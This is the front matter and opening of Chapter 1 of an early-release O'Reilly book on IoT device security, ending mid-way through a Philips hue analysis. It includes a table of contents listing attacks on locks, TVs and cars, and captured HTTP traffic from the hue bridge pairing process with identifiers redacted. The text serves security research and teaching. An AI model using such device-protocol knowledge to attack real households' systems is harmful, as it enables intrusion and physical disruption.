
Nitesh Dhanjani
Abusing the Internet of Things

Abusing the Internet of Things
by Nitesh Dhanjani
Copyright © 2010 Nitesh Dhanjani. All rights reserved.
Printed in the United States of America.
Published by O’Reilly Media, Inc., 1005 Gravenstein Highway North, Sebastopol, CA 95472.
O’Reilly books may be purchased for educational, business, or sales promotional use. Online editions are
also available for most titles (http://safaribooksonline.com). For more information, contact our corporate/
institutional sales department: 800-998-9938 or corporate@oreilly.com.
Editors: Mike Loukides and Brian Sawyer
Production Editor: FIX ME!
Copyeditor: FIX ME!
Proofreader: FIX ME!
Indexer: FIX ME!
Cover Designer: Karen Montgomery
Interior Designer: David Futato
Illustrator: Rebecca Demarest
January -4712:
First Edition
Revision History for the First Edition:
2015-04-03: Early release revision 1
2015-05-29: Early release revision 2
2015-06-08: Early release revision 3
2015-06-16: Early release revision 4
2015-06-26: Early release revision 5
See http://oreilly.com/catalog/errata.csp?isbn=0636920033547 for release details.
Nutshell Handbook, the Nutshell Handbook logo, and the O’Reilly logo are registered trademarks of O’Reilly
Media, Inc. !!FILL THIS IN!! and related trade dress are trademarks of O’Reilly Media, Inc.
Many of the designations used by manufacturers and sellers to distinguish their products are claimed as
trademarks. Where those designations appear in this book, and O’Reilly Media, Inc. was aware of a trademark
claim, the designations have been printed in caps or initial caps.
While every precaution has been taken in the preparation of this book, the publisher and authors assume
no responsibility for errors or omissions, or for damages resulting from the use of the information contained
herein.
ISBN: 063-6-920-03354-7
[?]

Table of Contents
Preface. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  vii
Malware Gone Wild                                                                                                     89
Some Things Never Change: The WeMo Switch                                                        90
Conclusion                                                                                                                        97
4. Blurred Lines: When the Physical Space Meets the Virtual Space. . . . . . . . . . . . . . . . . . .  99
SmartThings                                                                                                                   100
Hijacking Credentials                                                                                                114
Abusing the Physical Graph                                                                                     120
SmartThings SSL Certificate Validation Vulnerability                                         126
Interoperability with Insecurity Leads to … Insecurity                                           127
SmartThings and hue Lighting                                                                                 128
SmartThings and the WeMo Switch                                                                        135
Conclusion                                                                                                                      143
5. The Idiot Box: Attacking “Smart” Televisions. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  145
The TOCTTOU Attack                                                                                                 147
The SamSung LExxB650 Series                                                                                148
The Exploit                                                                                                                  150
You call that Encryption?                                                                                              153
Understanding XOR                                                                                                  154
I call it Encraption                                                                                                      156
Understanding and Exploiting the App World                                                         160
Decrypting Firmware                                                                                                160
Cursory Exploration of the Operating System                                                      162
Remotely Exploiting a SamSung Smart TV                                                           165
Inspecting Your Own Smart TV (and other IoT devices)                                       170
Say Hello to the Pineapple Mark V                                                                          170
Capturing credentials and stripping TLS                                                               175
Conclusion                                                                                                                      179
6. Connected Car Security Analysis: From Gas to Fully Electric. . . . . . . . . . . . . . . . . . . . . .  181
Tire Pressure Monitoring System (TPMS)                                                                 182
Reversing TPMS Communication                                                                           184
iv 
| 
Table of Contents

Eavesdropping and Privacy Implications                                                               186
Spoofing Alerts                                                                                                           187
Exploiting wireless connectivity                                                                                  188
Injecting CAN Data                                                                                                   188
Bluetooth Vulnerabilities                                                                                          190
Vulnerabilities in Telematics                                                                                     192
Significant Attack Surface                                                                                         194
Tesla Model S                                                                                                                  195
Locate and Steal a Tesla the Old Fashioned Way                                                   199
Social Engineering Tesla Employees and the Quest for Location Privacy         203
Handing Out Keys to Strangers                                                                               205
Or Just Borrow Someone’s Phone                                                                            207
Additional Information and Potential Low Hanging Fruit                                  208
Auto Pilot and the Autonomous Car                                                                      211
Conclusion                                                                                                                      213
7. Secure Prototyping: littleBits and cloudBits. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  215
Introducing the cloudBit Starter Kit                                                                           216
Setting Up the cloudBit                                                                                             219
Designing the SMS Doorbell                                                                                    227
Oops, We Forgot the Button!                                                                                    232
Security Evaluation                                                                                                        235
WiFi Insecurity, Albeit Brief                                                                                     235
Sneaking in Command Execution                                                                           238
One Token to Rule them All                                                                                     241
Beware of Hardware Debug Interfaces                                                                   245
Abuse Cases in the Context of Threat Agents                                                           248
Nation States, Including the NSA                                                                            249
Terrorists                                                                                                                     250
Criminal Organizations                                                                                             250
Disgruntled or Nosy Employees                                                                              251
Hacktivists                                                                                                                   253
Vandals                                                                                                                         254
Bullying                                                                                                                        259
Predators                                                                                                                      260
Bug Bounty Programs                                                                                                   261
Conclusion                                                                                                                      262
8. Securely Enabling our Future: A Conversation on Upcoming Attack Vectors. . . . . . . . .  265
The Thingbots Have Arrived                                                                                       265
The Rise of the Drones                                                                                                  266
Cross Device Attacks                                                                                                     267
Table of Contents 
| 
v

Hearing Voices                                                                                                               268
IoT Cloud Infrastructure Attacks                                                                                273
Backdoors                                                                                                                        274
The Lurking Heartbleed                                                                                                275
Diluting the Medical Record                                                                                        276
The Data Tsunami                                                                                                         281
Targeting Smart Cities                                                                                                   282
Inter Space Communication Will be a Ripe Target                                                  283
The Dangers of Superintelligence                                                                               284
Conclusion                                                                                                                      285
9. Two Scenarios: Intentions and Outcomes. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  287
The Cost of a Free Beverage                                                                                         287
There’s a Party at Ruby Skye                                                                                     288
Leveraging the “Buzz Word”                                                                                    289
The Board Meeting                                                                                                    289
A Case of Anger, Denial, and Self Destruction                                                          291
The Benefit of LifeThings                                                                                         291
Social Engineering Customer Support by Spoofing SMS                                    292
The (In)Secure Token                                                                                                293
Total Ownage                                                                                                              294
The Demise of LifeThings                                                                                         296
Conclusion                                                                                                                      298
vi 
| 
Table of Contents

Preface
The upcoming age of the Internet of Things (IoT) will blur the line between our physical
and online lives. Attacks targeting our online spaces will put our physical security at
risk. Traditionally, the attack vectors to our fundamental luxuries have required physical
tampering, mostly because access to the infrastructure has been limited from the In‐
ternet. This is about to change with the upcoming disruption caused by a future with
billions of “things” connected to the Internet.
In this book, we will take a fascinating look into abusing the most popular IoT-based
devices already available in the market. We will take a look at how a simple attack can
cause a perpetual blackout targeting LED lightbulbs, how bad security decisions have
grossly violated the physical safety and privacy of families, and how the insecurity of
powerful electric vehicles can put your life at risk.
The goal of this book is to demonstrate tangible risk in IoT devices that we are going to
depend on more and more as time progresses. Once we begin to understand the cause
of actual security vulnerabilities in devices today, we will begin to set the path for a future
that will help us enable these devices to securely enhance and augment our lives.
Malicious attackers are already hard at work uncovering and exploiting these security
defects and they will continue to find crafty avenues to abuse their knowledge every way
they can. These attackers span the spectrum of curious college students to sophisticated
private and state sponsored criminal gangs that are interested in terrorizing individuals
and populations. The impact of security vulnerabilities in IoT devices can lead to mass
compromise of privacy and cause physical harm. The stakes are high.
Who This Book Is For
This book is for anyone who is interested in deconstructing IoT devices in the market
today to find security vulnerabilities. Doing so will put you in the mindset of malicious
attackers who are also busy finding ways to exploit these devices to their advantage.
Once you understand the devious tactics employed by entities targeting the world of
vii

IoT, you will gain deeper insight into the tactics and psychology of attackers so you can
learn to protect yourself and to help design secure IoT products.
How to Use This Book
This book is organized into the following chapters:
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts
The book begins with a deep dive into the design and architecture of one of the
more popular IoT products available in the market: the Philips hue personal lighting
system. This chapter presents various security issues for the system, including fun‐
damental issues such as password security and the possibility of malware abusing
weak authorization mechanisms to cause sustained blackouts. We also discuss the
complexity of internetworking our online spaces (such as Facebook) with IoT de‐
vices, which can lead to security issues spanning multiple platforms.
Chapter 2: Electronic Lock Picking: Abusing Door Locks to Compromise Physical Secu‐
rity
This chapter takes a look at the security vulnerabilities surrounding existing elec‐
tronic door locks, their wireless mechanisms, and their integration with mobile
devices. We also present actual case studies of attackers that have exploited these
issues to conduct robberies.
Chapter 3: Assaulting the Radio Nurse: Breaching Baby Monitors and One Other
Thing
Security defects in remotely controllable baby monitors are covered in this chapter.
We take a look at details of actual vulnerabilities that have been abused by attackers
and show how such simple design flaws can put the safety of families at risk.
Chapter 4: Blurred Lines: When the Physical Space Meets the Virtual Space
Companies like SmartThings sell a suite of IoT devices and sensors that can be
leveraged to protect the home, such as receiving a notification of a potential intruder
if the main door of a home is opened after midnight. The fact that these devices use
the Internet to operate has increased our dependency on network connectivity,
thereby blurring the lines between our physical world and the cyber world. We take
a look at the security of the SmartThings suite of products and also how it is designed
to securely operate with devices from other manufacturers.
Chapter 5: The Idiot Box: Attacking “Smart” Televisions
Televisions today are essentially computers running powerful operating systems
such as Linux. They connect to the home WiFi and include services such as watching
streaming video, video conferencing, social networking, and instant messaging.
This chapter studies actual vulnerabilities in SamSung branded TVs to understand
the root cause of the flaws and the potential impact to our privacy and safety.
viii 
| 
Preface

Chapter 6: Connected Car Security Analysis: From Gas to Fully Electric
Cars are also things that are now accessible and controllable remotely. Unlike many
other devices, the interconnectedness of the car can serve important safety func‐
tionality, yet security vulnerability can lead to the loss of lives. This chapter studies
a low-range wireless system, followed by a review of extensive research performed
by leading experts in academia. We analyze and discuss features that can be found
in the Tesla Model S sedan, including possible ways the security of the car can be
improved.
Chapter 7: Secure Protyping: littleBits and cloudBits
The first order of business when desiging an IoT product is to create a prototype
to make certain the idea is feasible, to explore alternative design concepts, and to
provide specifications to build a solid business case. It becomes extremely important
to design security in the initial prototype and subsequent iterations towards the
final product. Security as an afterthought is bound to lead to finished products that
put the security and privacy of the consumers at risk. In this chapter, we prototype
an SMS doorbell that uses the littleBits prototyping platform. The cloudBit module
helps us provide remote wireless connectivity that allows us to prototype our IoT
idea to send an SMS message to the user when the doorbell is pressed. Discussion
of the prototype steps through security issues and requirements upon desiging the
protype and discuss important security considerations that should be addressed by
product designers.
Chapter 8: Securely Enabling our Future: A Conversation on Upcoming Attack Vectors
In the next few years, our dependance on IoT devices in our lives is bound to
skyrocket. In this chapter, we will predict plausable scenarios of attacks based upon
our understanding of how IoT devices will serve our needs in the future.
Chapter 9: Two Scenarios: Intentions and Outcomes
In this chapter, we will take a look at two different scenarios to gain a good appre‐
ciation of how people can influence security incidents. In the first scenario, we will
take a look at how an executive at a large corporation attempts to leverage the “buzz”
surrounding the topic of IoT with the intention that it will impress the board of
directors. In the second scenario, we will take a look at how an up and coming IoT
service provider chooses to engage and respond to researchers and journalists with
the intention of preserving the integrity of their business. The goal of this chapter
is to illustrate that, ultimately, the consequences of security related scenarios are
heavily influenced by the intentions and actions of the people involved.
Conventions Used in This Book
The following typographical conventions are used in this book:
Preface 
| 
ix

Italic
Indicates new terms, URLs, email addresses, filenames, and file extensions.
Constant width
Used for program listings, as well as within paragraphs to refer to program elements
such as variable or function names, databases, data types, environment variables,
statements, and keywords.
Constant width bold
Shows commands or other text that should be typed literally by the user.
Constant width italic
Shows text that should be replaced with user-supplied values or by values deter‐
mined by context.
This element signifies a tip or suggestion.
This element signifies a general note.
This element indicates a warning or caution.
Using Code Examples
This book is here to help you get your job done. In general, if example code is offered
with this book, you may use it in your programs and documentation. You do not need
to contact us for permission unless you’re reproducing a significant portion of the code.
For example, writing a program that uses several chunks of code from this book does
not require permission. Selling or distributing a CD-ROM of examples from O’Reilly
books does require permission. Answering a question by citing this book and quoting
example code does not require permission. Incorporating a significant amount of ex‐
ample code from this book into your product’s documentation does require permission.
x 
| 
Preface

We appreciate, but do not require, attribution. An attribution usually includes the title,
author, publisher, and ISBN. For example: “Abusing the Internet of Things by Nitesh
Dhanjani (O’Reilly). Copyright 2015 Nitesh Dhanjani, 978-1-491-90233-2.”
If you feel your use of code examples falls outside fair use or the permission given above,
feel free to contact us at permissions@oreilly.com.
Safari® Books Online
Safari Books Online is an on-demand digital library that
delivers expert content in both book and video form from
the world’s leading authors in technology and business.
Technology professionals, software developers, web designers, and business and crea‐
tive professionals use Safari Books Online as their primary resource for research, prob‐
lem solving, learning, and certification training.
Safari Books Online offers a range of plans and pricing for enterprise, government,
education, and individuals.
Members have access to thousands of books, training videos, and prepublication manu‐
scripts in one fully searchable database from publishers like O’Reilly Media, Prentice
Hall Professional, Addison-Wesley Professional, Microsoft Press, Sams, Que, Peachpit
Press, Focal Press, Cisco Press, John Wiley & Sons, Syngress, Morgan Kaufmann, IBM
Redbooks, Packt, Adobe Press, FT Press, Apress, Manning, New Riders, McGraw-Hill,
Jones & Bartlett, Course Technology, and hundreds more. For more information about
Safari Books Online, please visit us online.
How to Contact Us
Please address comments and questions concerning this book to the publisher:
O’Reilly Media, Inc.
1005 Gravenstein Highway North
Sebastopol, CA 95472
800-998-9938 (in the United States or Canada)
707-829-0515 (international or local)
707-829-0104 (fax)
We have a web page for this book, where we list errata, examples, and any additional
information. You can access this page at http://www.oreilly.com/catalog/<catalog page>.
To comment or ask technical questions about this book, send email to bookques
tions@oreilly.com.
Preface 
| 
xi

For more information about our books, courses, conferences, and news, see our website
at http://www.oreilly.com.
Find us on Facebook: http://facebook.com/oreilly
Follow us on Twitter: http://twitter.com/oreillymedia
Watch us on YouTube: http://www.youtube.com/oreillymedia
Acknowledgments
Thanks to Mike Loukides, Dawn Schanafelt, and Brian Sawyer for collaborating and
supporting the book from proposal to the finished product. Thank you to the entire
O’Reilly team, who made this book a reality.
Thanks to my friend Greg Zatkovich for his contageous enthusiasm and support.
Thanks to Sri Vasudevan for reviewing the chapters and for the valuable feedback.
xii 
| 
Preface

CHAPTER 1
Lights Out: Hacking Wireless Lightbulbs to
Cause Sustained Blackouts
The Northeast Blackout of 2003 was widespread and affected people throughout parts
of northeastern and midwestern United States and Ontario. Approximately 45 million
people were affected for as long as two days. In New York alone, 3,000 fire calls were
reported due to incidents related to individuals using candles. There were 60 cases of
alarm fires that were caused by the use of candles and two cases of fatalities that resulted
from the use of flames to provide light. In Michigan, candles left burning during the
blackout caused a fatal fire that destroyed a home.
The startling issue is not that the Northeast Blackout occurred, but how the developed
world takes luxuries like electricity for granted and how we have come to depend upon
it. Moments when our fundamental luxuries are taken away from us cause us to reflect
upon and appreciate our reliance upon them. We flip a switch and we expect the instant
glow of the electric flame. We open the refrigerator and expect our food and drinks to
be waiting for us at just the right temperature. We walk into our homes and expect the
air conditioning to continuously and automatically maintain a comfortable equilibrium
between hot and cold temperatures.
It’s been roughly 100 years since we’ve figured out how to generate electricity. Before
that, houses were lit with kerosene lamps and warmed with stoves. Our current level of
dependence upon electricity is phenomenal; our cities and businesses come to halt
within seconds of a blackout.
The United States is powered by three interconnected grids that move electricity around
the country: the Eastern Interconnection, Western Interconnection, and the Texas In‐
terconnection. These systems are interconnected by communication between utilities
and their transmission systems to share the benefits of building larger generators and
providing electricity at a lower cost.
1

Developed nations clearly rely upon the electric grid to empower and sustain their
economies and the well being of their citizens. Computers increasingly operate much
of the technology that comprises of the grid, inclusive of generators and transformers,
and their functionality is accessible remotely through computer networks. As such, the
concern over cyber-security-related threats is high.
In addition to the need to ensure the security of the power grid, the upcoming era of
consumer-based IoT product adds an additional technology ecosystem that also needs
to be protected: the security of the IoT products themselves. There are various products
in the market today that replace traditional lighting with bulbs that can be controlled
wirelessly and remotely. As we start to install IoT devices like these in our homes and
offices, we need to also be assured of the secure design of these devices, in addition to
the underlying infrastructure such as the power grid.
In this chapter, we will do a deep dive into the design and architecture of one of the
more popular IoT products available in the market: the Philips hue personal lighting
system. Our society has come to depend on lighting for convenience, as well as for our
safety, so it makes sense to use a popular IoT product in this space as the focus of the
first chapter. We will take a look at how the products operates and communicates from
a security perspective and attempt to locate security vulnerabilities. Only by deep anal‐
ysis can we begin to have a solid discussion and framework around the security issues
at hand today and learn how to construct secure IoT devices of the future.
Why hue?
We’ve established why lighting is paramount to our civilization’s convenience and safety.
As we begin analysis of IoT devices in this space, we’d specifically like to study the Philips
hue personal lighting system because of its popularity in the consumer market. It is one
of the first IoT-based lighting products to gain popularity, so it is likely to inspire com‐
peting products to follow its architecture and design. As such, a security analysis of the
hue product will give us a good understanding of what security mechanisms are being
employed in IoT products today, what potential vulnerabilities exist, and what changes
are necessary to securely design such products in the future.
The hue lighting system is available for purchase at various online and brick-and-mortar
outlets. As shown in Figure 1-1, the starter pack includes three wireless bulbs and a
bridge. The bulbs can be configured to any of 16 million colors using the hue website
or the iOS app.
2 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

Figure 1-1. The hue starter pack contains the bridge and three wireless bulbs
The bridge connects to the user’s router using an Ethernet cable, establishing and main‐
taining an outbound connection to the hue Internet infrastructure, as we will discuss
in the following sections. The bridge communicates directly with the LED bulbs using
the ZigBee protocol, which is built upon the IEEE 802.15.4 standard. ZigBee is a low-
cost and low-powered protocol, which makes it popular among IoT devices that com‐
municate with each other.
Why hue? 
| 
3

When the user is on the local network, the iOS app connects directly to the bridge to
issue commands that change the state of the bulbs. When the user is remote or when
the hue website is used, the instructions are sent through the hue Internet infrastructure.
In the following sections, we will study the underlying security architecture to under‐
stand the implementation and uncover weaknesses in the design. This will provide a
solid understanding of security issues that can impact popular consumer-based IoT
lighting systems in the market today.
Contolling Lights Via the Website Interface
A good way to uncover security vulnerabilities is to understand the underlying tech‐
nology architecture, and use-case analysis is one of the best ways to do so. The most
basic use case of the hue system is to register for an online hue account through the
website interface and associate the bridge to the account. Once this is accomplished, the
user can use his or her account to control the lights from a remote location. In this
section, we will take a look at how the system lets the user associate the bridge to his or
her account and control the lights from the website. Once we’ve shown how the use case
is implemented in design, we will discuss associated security issues and how they can
be exploited.
First, every user must register for a free account at the hue portal, shown in
Figure 1-2. The user is required to pick a name, enter his or her email address, and create
six-character (at minimum) password.
4 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

Figure 1-2. hue website account registration
In the second step, the website attempts to locate and associate the bridge with the
account the user just created. As shown in Figure 1-3, the website then displays the
message “We found your bridge.”
Contolling Lights Via the Website Interface 
| 
5

Figure 1-3. Associating the bridge with the website
The website knows that it has located the bridge because the bridge routinely connects
to the hue backend to broadcast its id (a unique id is assigned to every physical bridge
manufactured), internal IP address, and MAC address (identical to the id). The bridge
does this by making a POST request to dcs.cb.philips.com, like this:
POST /Dcs.ConnectionServiceHTTP/1.0
Host: dcs.cb.philips.com:8080
Authorization: CBAuth Type="SSO", Client="[DELETED]", RequestNr="16",
Nonce="[DELETED]", SSOToken="[DELETED]", Authentication="[DELETED]
Content-Type: application/CB-MessageStream; boundary=ICPMimeBoundary
Transfer-Encoding: Chunked
304
--ICPMimeBoundary
Content-Type: application/CB-Encrypted; cipher=AES
Content-Length:0000000672
[DELETED]
To which the server side responds:
HTTP/1.0 200 OK
WWW-Authenticate :  CBAuth Nonce="[DELETED]"
Connection : close
6 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

Content-Type : application/CB-MessageStream; boundary="ICPMimeBoundary"
Transfer-Encoding : Chunked
001
The code marked [DELETED] signifies actual content that was de‐
leted to preserve the confidentiality and integrity of the hardware and
accounts being tested. The removal of the associated characters has
no material effect on understanding the example.
The 001 response to the POST request indicates that the hue infrastructure has registered
the bridge by associating its id with the source IP address of the HTTP connection.
If you have the hue system installed, you can browse to https://www.meethue.com/api/
nupnp from your home network to obtain the information reported by your bridge to
the hue infrastructure. As shown in Figure 1-4, you’ll see the id of the bridge, along
with its MAC address and internal IP address. The hue website maintains a collection
of bridges (based on their id, internal IP addresses, and MAC addresses) and pairs them
with the source IP address of the TCP connection (as you are browsing the hue website).
This is why the website confidently displays “We found your bridge” (Figure 1-3).
Figure 1-4. Bridge’s id, internal IP address, and MAC address
The user does not have permission to use the bridge remotely until pressing the physical
button on the bridge within 30 seconds. Requiring the user to prove to the server side
that he or she has physical access to the bridge provides an additional layer of security.
After displaying the message in Figure 1-3, the web browser issues the following GET
request:
GET /en-US/user/isbuttonpressed HTTP/1.1
Host: www.meethue.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/536.28.10
Contolling Lights Via the Website Interface 
| 
7

(KHTML, like Gecko) Version/6.0.3 Safari/536.28.10
Accept: */*
DNT: 1
X-Requested-With: XMLHttpRequest
Referer: https://www.meethue.com/en-US/user/linkbridge
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Cookie:[DELETED]
Connection: keep-alive
Proxy-Connection: keep-alive
This GET request will wait for 30 seconds, giving the user time to physically press the
button on the bridge. When the user presses the button, the bridge sends a POST request
to dcp.cpp.philips.com signifying the event. In this situation, after the user has proven
physical ownership of the bridge, the server positively responds to the POST request:
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Cache-Control: no-cache
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Set-Cookie: PLAY_FLASH=;Path=/;Expires=Thu, 01 Jan 1970 00:00:00 GMT
Set-Cookie: PLAY_ERRORS=;Path=/;Expires=Thu, 01 Jan 1970 00:00:00 GMT
Set-Cookie: [DELETED]
Vary: Accept-Encoding
Date: Mon, 29 Apr 2013 23:30:06 GMT
Server: Google Frontend
Content-Length: 4
true
This response from the server indicates that the button was indeed pressed. The browser
then sends the following GET request to complete the setup:
GET /en-US/user/setupcomplete HTTP/1.1
Host: www.meethue.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3)
AppleWebKit/536.28.10
(KHTML, like Gecko) Version/6.0.3 Safari/536.28.10
Accept: text/html,application/xhtml+xml,application/xml;
DNT: 1
Referer: https://www.meethue.com/en-US/user/linkbridge
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Cookie: [DELETED]
Connection: keep-alive
Proxy-Connection: keep-alive
The server responds to the GET request with various types of details:
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8; charset=utf-8
Cache-Control: no-cache
Expires: Thu, 01 Jan 1970 00:00:00 GMT
8 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

Set-Cookie: PLAY_FLASH=;Path=/;Expires=Thu, 01 Jan 1970 00:00:00 GMT
Set-Cookie: PLAY_ERRORS=;Path=/;Expires=Thu, 01 Jan 1970 00:00:00 GMT
Set-Cookie: PLAY_SESSION="[DELETED]-%00ip_address%3A[DELETED]__[DELETED]
;Path=/
Vary: Accept-Encoding
Date: Mon, 29 Apr 2013 23:30:08 GMT
Server: Google Frontend
Content-Length: 47369
[DELETED]
app.data.bridge = {"clientMessageState":[DELETED],"config":{"lights":{"15":
{"name":"Bathroom 2","state":{"bri":254,"effect":"none","sat":144,"reachabl
e":true,"alert":"none","hue":14922,"colormode":"ct","on":false,"ct":369,"xy
":[0.4595,0.4105]},"modelid":"LCT001","swversion":"65003148","pointsymbol":
{"3":"none","2":"none","1":"none","7":"none","6":"none","5":"none","4":"non
e","8":"none"},"type":"Extended color light"},"13":{"name":"Bathroom 4","st
ate":{"bri":254,"effect":"none","sat":144,"reachable":true,"alert":"none","
hue":14922,"colormode":"ct","on":false,"ct":369,"xy":[0.4595,0.4105]},"mode
lid":"LCT001","swversion":"65003148","pointsymbol":{"3":"none","2":"none","
1":"none","7":"none","6":"none","5":"none","4":"none","8":"none"},"type":"E
xtended color light"},"14":{"name":"Bathroom 3","state":{"bri":254,"effect"
:"none","sat":144,"reachable":true,"alert":"none","hue":14922,"colormode":"
ct","on":false,"ct":369,"xy":[0.4595,0.4105]},"modelid":"LCT001","swversion
":"65003148","pointsymbol":{"3":"none","2":"none","1":"none","7":"none","6"
:"none","5":"none","4":"none","8":"none"},"type":"Extended color light"},"1
1":{"name":"Hallway 2","state":{"bri":123,"effect":"none","sat":254,"reacha
ble":true,"alert":"none","hue":17617,"colormode":"xy","on":false,"ct":424,"
xy":[0.492,0.4569]},"modelid":"LCT001","swversion":"65003148","pointsymbol"
:{"3":"none","2":"none","1":"none","7":"none","6":"none","5":"none","4":"no
ne","8":"none"},"type":"Extended color light"},"12":{"name":"Bathroom 1","s
tate":{"bri":254,"effect":"none","sat":144,"reachable":true,"alert":"none",
"hue":14922,"colormode":"ct","on":false,"ct":369,"xy":[0.4595,0.4105]},"mod
elid":"LCT001","swversion":"65003148","pointsymbol":{"3":"none","2":"none",
"1":"none","7":"none","6":"none","5":"none","4":"none","8":"none"},"type":"
Extended color light"},"3":{"name":"Living room lamp 2","state":{"bri":102,
"effect":"none","sat":234,"reachable":true,"alert":"none","hue":687,"colorm
ode":"xy","on":false,"ct":500,"xy":[0.6452,0.3312]},"modelid":"LCT001","swv
ersion":"65003148","pointsymbol":{"3":"none","2":"none","1":"none","7":"non
e","6":"none","5":"none","4":"none","8":"none"},"type":"Extended color ligh
